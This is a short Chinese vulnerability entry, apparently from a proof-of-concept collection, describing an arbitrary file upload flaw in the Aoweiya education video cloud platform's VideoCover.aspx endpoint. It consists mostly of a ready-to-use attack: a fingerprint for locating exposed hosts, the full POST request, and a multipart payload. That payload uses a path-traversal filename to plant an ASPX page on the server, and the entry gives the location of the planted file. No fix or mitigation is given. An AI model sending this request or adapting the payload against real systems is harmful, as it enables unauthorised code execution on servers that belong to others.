# 奥威亚教育视频云平台VideoCover存在任意文件上传漏洞

- **系统**：奥威亚教育视频云平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/CSS/NewtonTheme/assets/app.css"`
- **请求**：`POST /Tools/Video/VideoCover.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 301`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/stc.aspx"
Content-Type: image/png
<%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
--00content0boundary00--

上传文件位置
/stc.aspx
```

**其他**
- 奥威亚教育视频云平台VideoCover存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 奥威亚教育视频云平台